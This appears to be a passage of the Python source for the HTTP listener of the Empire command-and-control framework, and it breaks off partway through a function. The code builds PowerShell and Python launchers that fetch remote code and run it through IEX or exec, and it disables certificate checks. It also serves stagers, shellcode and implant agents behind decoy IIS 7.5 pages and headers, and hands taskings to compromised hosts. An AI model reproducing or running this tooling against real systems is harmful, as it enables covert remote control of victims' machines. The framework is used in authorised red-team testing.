import base64
import copy
import logging
import os
import secrets
import ssl
import time
from pathlib import Path
from textwrap import dedent

from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import ed25519
from flask import Flask, make_response, render_template, request, send_from_directory
from sqlalchemy import select
from werkzeug.serving import WSGIRequestHandler

from empire.server.common import encryption, helpers, packets, templating
from empire.server.common.empire import MainMenu
from empire.server.common.encryption import AESCipher
from empire.server.core.db import models
from empire.server.core.db.base import SessionLocal
from empire.server.core.exceptions import ListenerValidationException
from empire.server.utils import cert_util, data_util, listener_util, log_util

LOG_NAME_PREFIX = __name__
log = logging.getLogger(__name__)

STAGER_LANGUAGES = frozenset({"powershell", "python", "csharp", "ironpython", "go"})


class Listener:
    def __init__(self, mainMenu: MainMenu):
        self.mainMenu = mainMenu
        self.thread = None

    def post_init(self):
        self.options["Host"]["Value"] = f"http://{helpers.lhost()}"

        # optional/specific for this module
        self.host_address = None
        self.app = None
        self.uris = [
            a.strip("/")
            for a in self.options["DefaultProfile"]["Value"].split("|")[0].split(",")
        ]

        # set the default staging key to the controller db default
        self.options["StagingKey"]["Value"] = str(
            data_util.get_config("staging_key")[0]
        )

        self.session_cookie = self.options["Cookie"]["Value"]
        self.template_dir = self.mainMenu.install_path / "data/listeners/templates"
        self.instance_log = log

        self.agent_private_cert_key_object = ed25519.Ed25519PrivateKey.generate()
        self.server_private_cert_key_object = ed25519.Ed25519PrivateKey.generate()
        self.agent_private_cert_key = (
            self.agent_private_cert_key_object.private_bytes_raw()
        )
        self.agent_public_cert_key = encryption.publickey_unsafe(
            self.agent_private_cert_key
        )
        self.server_private_cert_key = (
            self.server_private_cert_key_object.private_bytes_raw()
        )
        self.server_public_cert_key = encryption.publickey_unsafe(
            self.server_private_cert_key
        )

    def default_response(self):
        """
        Returns an IIS 7.5 404 not found page.
        """
        return (self.template_dir / "default.html").read_text(encoding="utf-8")

    def validate_options(self) -> None:
        """
        Validate all options for this listener.
        """

        self.uris = [
            a.strip("/")
            for a in self.options["DefaultProfile"]["Value"].split("|")[0].split(",")
        ]

        self.host_address, err = self.mainMenu.listenersv2.validate_listener_address(
            self.options
        )
        if err:
            raise ListenerValidationException(err)

    def generate_launcher(
        self,
        encode=True,
        obfuscate=False,
        obfuscation_command="",
        user_agent="default",
        proxy="default",
        proxy_creds="default",
        language=None,
        listener_name=None,
        bypasses: list[str] | None = None,
    ):
        """
        Generate a basic launcher for the specified listener.
        """
        bypasses = [] if bypasses is None else bypasses
        if not language:
            log.error(
                f"{listener_name}: listeners/http generate_launcher(): no language specified!"
            )
            return None

        launcher = self.options["Launcher"]["Value"]
        staging_key = self.options["StagingKey"]["Value"]
        profile = self.options["DefaultProfile"]["Value"]
        uris = list(profile.split("|")[0].split(","))
        stage0 = secrets.choice(uris)
        customHeaders = profile.split("|")[2:]
        cookie = self.options["Cookie"]["Value"]

        if language == "powershell":
            stager = '$ErrorActionPreference = "SilentlyContinue";'

            for bypass in bypasses:
                stager += bypass

            stager += "$wc=New-Object System.Net.WebClient;"
            if user_agent.lower() == "default":
                profile = self.options["DefaultProfile"]["Value"]
                user_agent = profile.split("|")[1]
            stager += f"$u='{user_agent}';"

            if "https" in self.host_address:
                # allow for self-signed certificates for https connections
                stager += "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};"
            stager += f"$ser={helpers.obfuscate_call_home_address(self.host_address)};$t='{stage0}';"

            if user_agent.lower() != "none":
                stager += "$wc.Headers.Add('User-Agent',$u);"

                if proxy.lower() != "none":
                    if proxy.lower() == "default":
                        stager += "$wc.Proxy=[System.Net.WebRequest]::DefaultWebProxy;"
                    else:
                        # TODO: implement form for other proxy
                        stager += f"$proxy=New-Object Net.WebProxy('{proxy.lower()}');$wc.Proxy = $proxy;"

                    if proxy_creds.lower() != "none":
                        if proxy_creds.lower() == "default":
                            stager += "$wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;"

                        else:
                            # TODO: implement form for other proxy credentials
                            username = proxy_creds.split(":")[0]
                            password = proxy_creds.split(":")[1]
                            if len(username.split("\\")) > 1:
                                usr = username.split("\\")[1]
                                domain = username.split("\\")[0]
                                stager += f"$netcred = New-Object System.Net.NetworkCredential('{usr}', '{password}', '{domain}');"

                            else:
                                usr = username.split("\\")[0]
                                stager += f"$netcred = New-Object System.Net.NetworkCredential('{usr}', '{password}');"

                            stager += "$wc.Proxy.Credentials = $netcred;"

                    # save the proxy settings to use during the entire staging process and the agent
                    stager += "$Script:Proxy = $wc.Proxy;"

            # check if we're using IPv6
            # code to turn the key string into a byte array
            stager += f"$K=[System.Text.Encoding]::ASCII.GetBytes('{staging_key}');"

            # prebuild the request routing packet for the launcher
            routingPacket = packets.build_routing_packet(
                staging_key,
                sessionID="00000000",
                language="POWERSHELL",
                meta="STAGE0",
                additional="None",
                encData="",
            )
            b64RoutingPacket = base64.b64encode(routingPacket)

            # Add custom headers if any
            if customHeaders != []:
                for header in customHeaders:
                    headerKey = header.split(":")[0]
                    headerValue = header.split(":")[1]
                    # If host header defined, assume domain fronting is in use and add a call to the base URL first
                    # this is a trick to keep the true host name from showing in the TLS SNI portion of the client hello
                    if headerKey.lower() == "host":
                        stager += "try{$ig=$wc.DownloadData($ser)}catch{};"
                    stager += (
                        "$wc.Headers.Add(" + f"'{headerKey}','" + headerValue + "');"
                    )

            # add the AES-GCM routing packet to a cookie
            stager += f'$wc.Headers.Add("Cookie","{cookie}={b64RoutingPacket.decode("UTF-8")}");'
            stager += "$data=$wc.DownloadData($ser+$t);"

            # decode everything and kick it over to IEX to kick off execution
            stager += "IEX ([Text.Encoding]::UTF8.GetString($data))"

            # Remove comments and make one line
            stager = helpers.strip_powershell_comments(stager)
            stager = data_util.ps_convert_to_oneliner(stager)

            if obfuscate:
                stager = self.mainMenu.obfuscationv2.obfuscate(
                    stager,
                    obfuscation_command=obfuscation_command,
                )

            if encode and (
                (not obfuscate) or ("launcher" not in obfuscation_command.lower())
            ):
                return helpers.powershell_launcher(stager, launcher)

            return stager

        if language in ["python", "ironpython"]:
            # Python
            launcherBase = "import sys;"
            if "https" in self.host_address:
                # monkey patch ssl woohooo
                launcherBase += dedent(
                    """
                    import ssl;
                    if hasattr(ssl, '_create_unverified_context'):ssl._create_default_https_context = ssl._create_unverified_context;
                    """
                )

            for bypass in bypasses:
                launcherBase += bypass

            if user_agent.lower() == "default":
                profile = self.options["DefaultProfile"]["Value"]
                user_agent = profile.split("|")[1]

            launcherBase += dedent(
                f"""
                import urllib.request;
                UA='{user_agent}';server='{self.host_address}';t='{stage0}';
                req=urllib.request.Request(server+t);
                """
            )

            # prebuild the request routing packet for the launcher
            routingPacket = packets.build_routing_packet(
                staging_key,
                sessionID="00000000",
                language="PYTHON",
                meta="STAGE0",
                additional="None",
                encData="",
            )

            b64RoutingPacket = base64.b64encode(routingPacket).decode("UTF-8")

            # Add custom headers if any
            if customHeaders != []:
                for header in customHeaders:
                    headerKey = header.split(":")[0]
                    headerValue = header.split(":")[1]
                    launcherBase += f'req.add_header("{headerKey}","{headerValue}");\n'

            if proxy.lower() != "none":
                if proxy.lower() == "default":
                    launcherBase += "proxy = urllib.request.ProxyHandler();\n"
                else:
                    proto = proxy.split(":")[0]
                    launcherBase += f"proxy = urllib.request.ProxyHandler({{'{proto}':'{proxy}'}});\n"

                if proxy_creds != "none":
                    if proxy_creds == "default":
                        launcherBase += "o = urllib.request.build_opener(proxy);\n"

                        # add the routing packet to a cookie
                        launcherBase += f'o.addheaders=[(\'User-Agent\',UA), ("Cookie", "{cookie}={b64RoutingPacket}")];\n'
                    else:
                        username = proxy_creds.split(":")[0]
                        password = proxy_creds.split(":")[1]
                        launcherBase += dedent(
                            f"""
                            proxy_auth_handler = urllib.request.ProxyBasicAuthHandler();
                            proxy_auth_handler.add_password(None,'{proxy}','{username}','{password}');
                            o = urllib.request.build_opener(proxy, proxy_auth_handler);
                            o.addheaders=[('User-Agent',UA), ("Cookie", "{cookie}={b64RoutingPacket}")];
                            """
                        )

                else:
                    launcherBase += "o = urllib.request.build_opener(proxy);\n"
            else:
                launcherBase += "o = urllib.request.build_opener();\n"

            # install proxy and creds globally, so they can be used with urlopen.
            launcherBase += "urllib.request.install_opener(o);\n"
            launcherBase += "data=urllib.request.urlopen(req).read();\n"

            # download the stager and extract the IV
            launcherBase += listener_util.python_extract_stager(staging_key)

            if obfuscate:
                launcherBase = self.mainMenu.obfuscationv2.python_obfuscate(
                    launcherBase
                )

            if encode:
                launchEncoded = base64.b64encode(launcherBase.encode("UTF-8")).decode(
                    "UTF-8"
                )
                if isinstance(launchEncoded, bytes):
                    launchEncoded = launchEncoded.decode("UTF-8")
                return f"echo \"import sys,base64,warnings;warnings.filterwarnings('ignore');exec(base64.b64decode('{launchEncoded}'));\" | python3 &"
            return launcherBase

        # very basic csharp implementation
        if language == "csharp":
            workingHours = self.options["WorkingHours"]["Value"]
            killDate = self.options["KillDate"]["Value"]
            customHeaders = profile.split("|")[2:]  # todo: support custom headers
            delay = self.options["DefaultDelay"]["Value"]
            jitter = self.options["DefaultJitter"]["Value"]
            lostLimit = self.options["DefaultLostLimit"]["Value"]

            raw_key_bytes = self.agent_private_cert_key_object.private_bytes(
                encoding=serialization.Encoding.Raw,
                format=serialization.PrivateFormat.Raw,
                encryption_algorithm=serialization.NoEncryption(),
            )

            private_key_array = ",".join(f"0x{b:02x}" for b in raw_key_bytes)

            raw_key_bytes = (
                self.agent_private_cert_key_object.public_key().public_bytes(
                    encoding=serialization.Encoding.Raw,
                    format=serialization.PublicFormat.Raw,
                )
            )
            public_key_array = ",".join(f"0x{b:02x}" for b in raw_key_bytes)

            stager_yaml = (
                self.mainMenu.install_path / "stagers/Sharpire.yaml"
            ).read_text(encoding="utf-8")
            stager_yaml = (
                stager_yaml.replace("{{ REPLACE_ADDRESS }}", self.host_address)
                .replace("{{ REPLACE_STAGINGKEY }}", staging_key)
                .replace("{{ REPLACE_PROFILE }}", profile)
                .replace("{{ REPLACE_WORKINGHOURS }}", workingHours)
                .replace("{{ REPLACE_KILLDATE }}", killDate)
                .replace("{{ REPLACE_DELAY }}", str(delay))
                .replace("{{ REPLACE_JITTER }}", str(jitter))
                .replace("{{ REPLACE_LOSTLIMIT }}", str(lostLimit))
                .replace(
                    "{{ REPLACE_DEFAULTRESPONSE }}",
                    base64.b64encode(self.default_response().encode("UTF-8")).decode(
                        "UTF-8"
                    ),
                )
                .replace("{{ agent_private_cert_key }}", private_key_array)
                .replace("{{ agent_public_cert_key }}", public_key_array)
            )

            return str(
                self.mainMenu.dotnet_compiler.compile_stager(
                    stager_yaml, "Sharpire", confuse=obfuscate
                )
            )

        self.instance_log.error(
            f"{listener_name}: listeners/http generate_launcher(): invalid language specification: only 'powershell' and 'python' are currently supported for this module."
        )
        return None

    def generate_stager(
        self,
        listenerOptions,
        encode=False,
        encrypt=True,
        obfuscate=False,
        obfuscation_command="",
        language=None,
    ):
        """
        Generate the stager code needed for communications with this listener.
        """
        if not language:
            log.error("listeners/http generate_stager(): no language specified!")
            return None

        profile = listenerOptions["DefaultProfile"]["Value"]
        uris = [a.strip("/") for a in profile.split("|")[0].split(",")]
        stagingKey = listenerOptions["StagingKey"]["Value"]
        workingHours = listenerOptions["WorkingHours"]["Value"]
        killDate = listenerOptions["KillDate"]["Value"]

        # select some random URIs for staging from the main profile
        stage1 = secrets.choice(uris)
        stage2 = secrets.choice(uris)

        if language.lower() == "powershell":
            template_path = [
                self.mainMenu.install_path / "listeners",
            ]

            eng = templating.TemplateEngine(template_path)
            template = eng.get_template("http/http.ps1.j2")
            custom_headers = listener_util.parse_custom_headers(profile)
            raw_key_bytes = self.agent_private_cert_key_object.private_bytes(
                encoding=serialization.Encoding.Raw,
                format=serialization.PrivateFormat.Raw,
                encryption_algorithm=serialization.NoEncryption(),
            )

            private_key_array = ",".join(f"0x{b:02x}" for b in raw_key_bytes)

            raw_key_bytes = (
                self.agent_private_cert_key_object.public_key().public_bytes(
                    encoding=serialization.Encoding.Raw,
                    format=serialization.PublicFormat.Raw,
                )
            )
            public_key_array = ",".join(f"0x{b:02x}" for b in raw_key_bytes)
            raw_key_bytes = (
                self.server_private_cert_key_object.public_key().public_bytes(
                    encoding=serialization.Encoding.Raw,
                    format=serialization.PublicFormat.Raw,
                )
            )
            server_public_key_array = ",".join(f"0x{b:02x}" for b in raw_key_bytes)
            template_options = {
                "working_hours": workingHours,
                "kill_date": killDate,
                "staging_key": stagingKey,
                "profile": profile,
                "session_cookie": self.session_cookie,
                "host": self.host_address,
                "stage_1": stage1,
                "stage_2": stage2,
                "agent_private_cert_key": private_key_array,
                "server_public_cert_key": server_public_key_array,
                "agent_public_cert_key": public_key_array,
                "custom_headers": custom_headers,
            }
            stager = template.render(template_options)

            if obfuscate:
                stager = self.mainMenu.obfuscationv2.obfuscate(
                    stager, obfuscation_command=obfuscation_command
                )

            if encode:
                return helpers.enc_powershell(stager)

            return stager

        if language.lower() == "python":
            template_path = [
                self.mainMenu.install_path / "listeners",
            ]

            eng = templating.TemplateEngine(template_path)
            template = eng.get_template("http/http.py.j2")
            template_options = {
                "working_hours": workingHours,
                "kill_date": killDate,
                "staging_key": stagingKey,
                "agent_private_cert_key": self.agent_private_cert_key,
                "server_public_cert_key": self.server_public_cert_key,
                "agent_public_cert_key": self.agent_public_cert_key,
                "profile": profile,
                "session_cookie": self.session_cookie,
                "host": self.host_address,
                "stage_1": stage1,
                "stage_2": stage2,
            }
            stager = template.render(template_options)

            if obfuscate:
                stager = self.mainMenu.obfuscationv2.python_obfuscate(stager)

            if encode:
                return base64.b64encode(stager)

            return stager

        log.error(
            "listeners/http generate_stager(): invalid language specification, only 'powershell' and 'python' are currently supported for this module."
        )
        return None

    def generate_agent(
        self,
        listenerOptions,
        language=None,
        obfuscate=False,
        obfuscation_command="",
        version="",
    ):
        """
        Generate the full agent code needed for communications with this listener.
        """

        if not language:
            log.error("listeners/http generate_agent(): no language specified!")
            return None

        language = language.lower()
        delay = listenerOptions["DefaultDelay"]["Value"]
        jitter = listenerOptions["DefaultJitter"]["Value"]
        profile = listenerOptions["DefaultProfile"]["Value"]
        lostLimit = listenerOptions["DefaultLostLimit"]["Value"]
        b64DefaultResponse = base64.b64encode(self.default_response().encode("UTF-8"))

        if language == "powershell":
            code = (self.mainMenu.install_path / "data/agent/agent.ps1").read_text(
                encoding="utf-8"
            )

            # strip out comments and blank lines
            code = helpers.strip_powershell_comments(code)

            # patch in the delay, jitter, lost limit, and comms profile
            code = code.replace("$AgentDelay = 60", f"$AgentDelay = {delay}")
            code = code.replace("$AgentJitter = 0", f"$AgentJitter = {jitter}")
            code = code.replace(
                '$Profile = "/admin/get.php,/news.php,/login/process.php|Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"',
                f'$Profile = "{profile}"',
            )
            code = code.replace("$LostLimit = 60", f"$LostLimit = {lostLimit}")
            code = code.replace(
                '$DefaultResponse = ""',
                f'$DefaultResponse = "{b64DefaultResponse.decode("UTF-8")}"',
            )

            if obfuscate:
                code = self.mainMenu.obfuscationv2.obfuscate(
                    code,
                    obfuscation_command=obfuscation_command,
                )
            return code

        if language == "python":
            agent_path = (
                self.mainMenu.install_path / "data/agent/ironpython_agent.py"
                if version == "ironpython"
                else self.mainMenu.install_path / "data/agent/agent.py"
            )
            code = agent_path.read_text(encoding="utf-8")

            # strip out comments and blank lines
            code = helpers.strip_python_comments(code)

            # patch in the delay, jitter, lost limit, and comms profile
            code = code.replace("delay=60", f"delay={delay}")
            code = code.replace("jitter=0.0", f"jitter={jitter}")
            code = code.replace(
                'profile = "/admin/get.php,/news.php,/login/process.php|Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"',
                f'profile = "{profile}"',
            )
            code = code.replace(
                'defaultResponse = base64.b64decode("")',
                f'defaultResponse = base64.b64decode("{b64DefaultResponse.decode("UTF-8")}")',
            )

            if obfuscate:
                code = self.mainMenu.obfuscationv2.python_obfuscate(code)

            return code
        if language == "csharp":
            # currently the agent is stagless so do nothing
            return ""

        log.error(
            "listeners/http generate_agent(): invalid language specification, only 'powershell', 'python', & 'csharp' are currently supported for this module."
        )
        return None

    def generate_comms(self, listenerOptions, language=None):
        """
        Generate just the agent communication code block needed for communications with this listener.

        This is so agents can easily be dynamically updated for the new listener.
        """
        if not language:
            log.error("listeners/http generate_comms(): no language specified!")
            return None

        if language.lower() == "powershell":
            template_path = [
                self.mainMenu.install_path / "listeners",
            ]

            eng = templating.TemplateEngine(template_path)
            template = eng.get_template("http/comms.ps1.j2")
            raw_key_bytes = self.agent_private_cert_key_object.private_bytes(
                encoding=serialization.Encoding.Raw,
                format=serialization.PrivateFormat.Raw,
                encryption_algorithm=serialization.NoEncryption(),
            )

            powershell_array = ",".join(f"0x{b:02x}" for b in raw_key_bytes)
            template_options = {
                "session_cookie": self.session_cookie,
                "host": self.host_address,
                "agent_private_cert_key": powershell_array,
                "agent_public_cert_key": self.agent_public_cert_key,
                "custom_headers": listener_util.parse_custom_headers(
                    self.options["DefaultProfile"]["Value"]
                ),
            }

            return template.render(template_options)

        if language.lower() == "python":
            template_path = [
                self.mainMenu.install_path / "listeners",
            ]
            eng = templating.TemplateEngine(template_path)
            template = eng.get_template("http/comms.py.j2")

            template_options = {
                "session_cookie": self.session_cookie,
                "host": self.host_address,
            }

            return template.render(template_options)

        log.error(
            "listeners/http generate_comms(): invalid language specification, only 'powershell' and 'python' are currently supported for this module."
        )
        return None

    def start_server(self, listenerOptions):
        """
        Threaded function that actually starts up the Flask server.
        """
        # TODO VR Since name is editable, we should probably use the listener's id here.
        #  But its not available until we do some refactoring. For now, we'll just use the name.
        self.instance_log = log_util.get_listener_logger(
            LOG_NAME_PREFIX, self.options["Name"]["Value"]
        )

        # make a copy of the currently set listener options for later stager/agent generation
        listenerOptions = copy.deepcopy(listenerOptions)

        # suppress the normal Flask output
        werkzeug_log = logging.getLogger("werkzeug")
        werkzeug_log.setLevel(logging.ERROR)

        bindIP = listenerOptions["BindIP"]["Value"]
        port = listenerOptions["Port"]["Value"]
        stagingKey = listenerOptions["StagingKey"]["Value"]
        userAgent = listenerOptions["UserAgent"]["Value"]
        listenerName = listenerOptions["Name"]["Value"]
        proxy = listenerOptions["Proxy"]["Value"]
        proxyCreds = listenerOptions["ProxyCreds"]["Value"]

        if os.environ.get("TEST_MODE"):
            # Let's not start the server if we're running tests.
            while True:
                time.sleep(1)

        app = Flask(__name__, template_folder=self.template_dir)
        self.app = app

        # Set HTTP/1.1 as in IIS 7.5 instead of /1.0
        WSGIRequestHandler.protocol_version = "HTTP/1.1"

        def generate_stager_response(stager, hop=None):
            stager = stager.lower()
            obfuscation = False
            obfuscation_command = ""
            # The go builder carries no obfuscation config, so it must not
            # check a connection out of the shared pool on this
            # unauthenticated path just to do nothing with it.
            if stager != "go":
                with SessionLocal.begin() as db:
                    obfuscation_config = (
                        self.mainMenu.obfuscationv2.get_obfuscation_config(
                            db, "csharp" if stager == "ironpython" else stager
                        )
                    )
                    obfuscation = obfuscation_config.enabled
                    obfuscation_command = obfuscation_config.command

            if stager == "powershell":
                return self.mainMenu.stagergenv2.generate_launcher(
                    listener_name=hop or listenerName,
                    language="powershell",
                    encode=False,
                    obfuscate=obfuscation,
                    obfuscation_command=obfuscation_command,
                    user_agent=userAgent,
                    proxy=proxy,
                    proxy_creds=proxyCreds,
                )

            if stager == "python":
                return self.mainMenu.stagergenv2.generate_launcher(
                    listener_name=hop or listenerName,
                    language="python",
                    encode=False,
                    obfuscate=obfuscation,
                    obfuscation_command=obfuscation_command,
                    user_agent=userAgent,
                    proxy=proxy,
                    proxy_creds=proxyCreds,
                )

            if stager == "ironpython":
                if hop:
                    options = copy.deepcopy(self.options)
                    options["Listener"] = {}
                    options["Listener"]["Value"] = hop
                    options["Language"] = {}
                    options["Language"]["Value"] = stager
                    launcher = self.mainMenu.stagergenv2.generate_stageless(options)
                else:
                    launcher = self.mainMenu.stagergenv2.generate_launcher(
                        listener_name=hop or listenerName,
                        language="python",
                        encode=False,
                        obfuscate=obfuscation,
                        user_agent=userAgent,
                        proxy=proxy,
                        proxy_creds=proxyCreds,
                    )

                directory = self.mainMenu.stagergenv2.generate_python_exe(
                    launcher, dot_net_version="net40", obfuscate=obfuscation
                )
                return listener_util.read_stager_artifact(directory)

            if stager == "csharp":
                path = self.mainMenu.stagergenv2.generate_launcher(
                    listener_name=hop or listenerName,
                    language="csharp",
                    encode=False,
                    obfuscate=obfuscation,
                    user_agent=userAgent,
                    proxy=proxy,
                    proxy_creds=proxyCreds,
                )
                return listener_util.read_stager_artifact(path)
            if stager == "go":
                directory = self.mainMenu.stagergenv2.generate_go_stageless(
                    self.options, listenerName
                )
                return listener_util.read_stager_artifact(directory)

            return make_response(self.default_response(), 404)

        @app.before_request
        def check_ip():
            """
            Before every request, check if the IP address is allowed.
            """
            if not self.mainMenu.agentcommsv2.is_ip_allowed(request.remote_addr):
                listenerName = self.options["Name"]["Value"]
                message = f"{listenerName}: {request.remote_addr} on the blacklist/not on the whitelist requested resource"
                self.instance_log.info(message)
                return make_response(self.default_response(), 404)
            return None

        @app.after_request
        def change_header(response):
            """
            Modify the headers response server.
            """
            headers = listenerOptions["Headers"]["Value"]
            for key in headers.split("|"):
                if key.split(":")[0].lower() == "server":
                    WSGIRequestHandler.server_version = key.split(":")[1]
                    WSGIRequestHandler.sys_version = ""
                else:
                    value = key.split(":")
                    response.headers[value[0]] = value[1]
            return response

        @app.after_request
        def add_proxy_headers(response):
            """
            Add HTTP headers to avoid proxy caching.
            """
            response.headers["Cache-Control"] = "no-cache, no-store, must-revalidate"
            response.headers["Pragma"] = "no-cache"
            response.headers["Expires"] = "0"
            return response

        @app.errorhandler(405)
        def handle_405(e):
            """
            Returns IIS 7.5 405 page for every Flask 405 error.
            """
            return render_template("method_not_allowed.html"), 405

        # Anything that escapes a view serves the IIS 7.5 404 page instead of
        # Flask's stock 500, which is this listener's loudest tell.
        listener_util.register_default_response_error_handler(app, self, 404)

        @app.route("/")
        @app.route("/iisstart.htm")
        def serve_index():
            """
            Return default server web page if user navigates to index.
            """
            return render_template("index.html"), 200

        @app.route("/<path:request_uri>", methods=["GET"])
        def handle_get(request_uri):
            """
            Handle an agent GET request.
            This is used during the first step of the staging process,
            and when the agent requests taskings.
            """

            if request_uri.lower() == "welcome.png":
                # Serves image loaded by index page.
                #
                # Thanks to making it case-insensitive it works the same way as in
                # an actual IIS server
                static_dir = self.mainMenu.install_path / "data/misc"
                return send_from_directory(static_dir, "welcome.png")

            clientIP = request.remote_addr
            listenerName = self.options["Name"]["Value"]

            stager = request.args.get("stager")
            if stager:
                try:
                    stager_id = int(stager)
                except (TypeError, ValueError):
                    stager_id = None
                if stager_id is not None:
                    stager = packets.LANGUAGE_IDS.get(stager_id, stager)
                stager = stager.lower()
                hop = request.args.get("hop")

                # Both values are still unvalidated here and reach the log
                # ahead of the allowlist, so they are escaped and capped:
                # query strings arrive percent-decoded, and the instance log
                # has no rotation.
                message = (
                    f"{listenerName}: "
                    f"{listener_util.sanitize_log_value(stager)} stager request "
                    f"(hop: {listener_util.sanitize_log_value(hop)}) from {clientIP}"
                )
                self.instance_log.info(message)

                if stager not in STAGER_LANGUAGES:
                    return make_response(self.default_response(), 404)

                return generate_stager_response(stager, hop)

            message = f"{listenerName}: GET request for {request.host}/{request_uri} from {clientIP}"
            self.instance_log.info(message)

            routingPacket = None
            cookie = request.headers.get("Cookie")

            if cookie and cookie != "":
                try:
                    # see if we can extract the 'routing packet' from the specified cookie location
                    # NOTE: this can be easily moved to a parameter, another cookie value, etc.
                    if self.session_cookie in cookie:
                        message = f"{listenerName}: GET cookie value from {clientIP} : {cookie}"
                        self.instance_log.info(message)
                        cookieParts = cookie.split(";")
                        for part in cookieParts:
                            if part.startswith(self.session_cookie):
                                base64RoutingPacket = part[part.find("=") + 1 :]
                                # decode the routing packet base64 value in the cookie
                                routingPacket = base64.b64decode(base64RoutingPacket)
                except Exception:
                    routingPacket = None
                    pass

            if not routingPacket:
                message = f"{listenerName}: {request_uri} requested by {clientIP} with no routing packet."
                self.instance_log.error(message)
                return make_response(self.default_response(), 404)

            # parse the routing packet and process the results
            dataResults = self.mainMenu.agentcommsv2.handle_agent_data(
                stagingKey,
                self.agent_public_cert_key,
                self.server_private_cert_key,
                self.server_public_cert_key,
                routingPacket,
                listenerOptions,
                clientIP,
            )

            if not dataResults or len(dataResults) <= 0:
                return make_response(self.default_response(), 200)

            for language, results, additional in dataResults:
                if not results:
                    message = f"{listenerName}: Results are None for {request_uri} from {clientIP}"
                    self.instance_log.debug(message)
                    return make_response(self.default_response(), 200)

                if isinstance(results, str):
                    results = results.encode("UTF-8")

                if results == b"STAGE0":
                    # handle_agent_data() signals that the listener should return the stager.ps1 code
                    # step 2 of negotiation -> return stager.ps1 (stage 1)
                    message = f"{listenerName}: Sending {language} stager (stage 1) to {clientIP}"
                    self.instance_log.info(message)
                    log.info(message)

                    # Check for hop listener
                    hopListenerName = request.headers.get("Hop-Name")
                    hopListener = self.mainMenu.listenersv2.get_active_listener_by_name(
                        hopListenerName
                    )

                    with SessionLocal() as db:
                        obf_config = self.mainMenu.obfuscationv2.get_obfuscation_config(
                            db, language
                        )

                        if additional.lower() == "shellcode":
                            stage, err = self.mainMenu.stagergenv2.generate_shellcode(
                                language=language.lower(),
                                listener_name=hopListenerName or listenerName,
                                obfuscate=obf_config.enabled if obf_config else False,
                                obfuscation_command=obf_config.command
                                if obf_config
                                else "",
                                arch="both",
                                dot_net_version="net40",
                            )
                            if err:
                                log.error(f"Error generating shellcode: {err}")
                                return make_response(self.default_response(), 404)
                            return make_response(stage, 200)

                        if language.lower() in ["csharp", "ironpython", "go"]:
                            return generate_stager_response(language, hopListenerName)

                        if hopListener:
                            stage = hopListener.generate_stager(
                                language=language,
                                listenerOptions=hopListener.options,
                                obfuscate=(
                                    False if not obf_config else obf_config.enabled
                                ),
                                obfuscation_command=(
                                    "" if not obf_config else obf_config.command
                                ),
                            )

                        else:
                            stage = self.generate_stager(
                                language=language,
                                listenerOptions=listenerOptions,
                                obfuscate=(
                                    False if not obf_config else obf_config.enabled
                                ),
                                obfuscation_command=(
                                    "" if not obf_config else obf_config.command
                                ),
                            )

                    # generate_stager() returns None on failure: this listener's
                    # own generate_stager on an unsupported language, or — via the
                    # Hop-Name → hopListener branch above — a pivot whose parent
                    # listener can't supply staging keys. Serving None makes Flask
                    # emit a bare 500; return the default 404 instead, matching the
                    # shellcode branch above.
                    if stage is None:
                        log.error(
                            f"{listenerName}: stager generation returned None for "
                            f"{clientIP}; serving default response"
                        )
                        return make_response(self.default_response(), 404)
                    return make_response(stage, 200)

                if results.startswith(b"ERROR:"):
                    message = f"{listenerName}: Error from agents.handle_agent_data() for {request_uri} from {clientIP}: {results}"
                    self.instance_log.error(message)

                    if b"not in cache" in results:
                        # signal the client to restage
                        log.info(
                            f"{listenerName}: Orphaned agent from {clientIP}, signaling restaging"
                        )
                        return make_response(self.default_response(), 401)
                    return make_response(self.default_response(), 200)

                # actual taskings
                message = f"{listenerName}: Agent from {clientIP} retrieved taskings"
                self.instance_log.info(message)
                return make_response(results, 200)
            return None

        @app.route("/<path:request_uri>", methods=["POST"])
        def handle_post(request_uri):
            """
            Handle an agent POST request.
            """

            stagingKey = listenerOptions["StagingKey"]["Value"]
            clientIP = request.remote_addr
            requestData = request.get_data()

            listenerName = self.options["Name"]["Value"]
            message = f"{listenerName}: POST request data length from {clientIP} : {len(requestData)}"
            self.instance_log.info(message)

            # the routing packet should be at the front of the binary request.data
            #   NOTE: this can also go into a cookie/etc.
            dataResults = self.mainMenu.agentcommsv2.handle_agent_data(
                stagingKey,
                self.agent_public_cert_key,
                self.server_private_cert_key,
                self.server_public_cert_key,
                requestData,
                listenerOptions,
                clientIP,
            )

            if not dataResults or len(dataResults) <= 0:
                return make_response(self.default_response(), 404)

            for language, results, _ in dataResults:
                if isinstance(results, str):
                    results = results.encode("UTF-8")

                if not results:
                    return make_response(self.default_response(), 404)

                if results.startswith(b"STAGE2"):
                    # TODO: document the exact results structure returned
                    if ":" in clientIP:
                        clientIP = "[" + str(clientIP) + "]"
                    sessionID = results.split(b" ")[1].strip().decode("UTF-8")
                    sessionKey = self.mainMenu.agentcommsv2.agents[sessionID][
                        "sessionKey"
                    ]

                    listenerName = self.options["Name"]["Value"]
                    message = f"{listenerName}: Sending agent (stage 2) to {sessionID} at {clientIP}"
                    self.instance_log.info(message)
                    log.info(message)

                    hopListenerName = request.headers.get("Hop-Name")

                    # Check for hop listener
                    hopListener = data_util.get_listener_options(hopListenerName)
                    tempListenerOptions = copy.deepcopy(listenerOptions)
                    if hopListener is not None:
                        tempListenerOptions["Host"]["Value"] = hopListener.options[
                            "Host"
                        ]["Value"]
                        with SessionLocal.begin() as db:
                            db_agent = self.mainMenu.agentsv2.get_by_id(db, sessionID)
                            db_agent.listener = hopListenerName
                    else:
                        tempListenerOptions = listenerOptions

                    session_info = (
                        SessionLocal()
                        .scalars(
                            select(models.Agent).where(
                                models.Agent.session_id == sessionID
                            )
                        )
                        .first()
                    )
                    if session_info.language == "ironpython":
                        version = "ironpython"
                    else:
                        version = ""

                    # step 6 of negotiation -> server sends patched agent.ps1/agent.py
                    with SessionLocal() as db:
                        obf_config = self.mainMenu.obfuscationv2.get_obfuscation_config(
                            db, language
                        )
                        if language.lower() != "go":
                            agentCode = self.generate_agent(
                                language=language,
                                listenerOptions=tempListenerOptions,
                                obfuscate=(
                                    False if not obf_config else obf_config.enabled
                                ),
                                obfuscation_command=(
                                    "" if not obf_config else obf_config.command
                                ),
                                version=version,
                            )
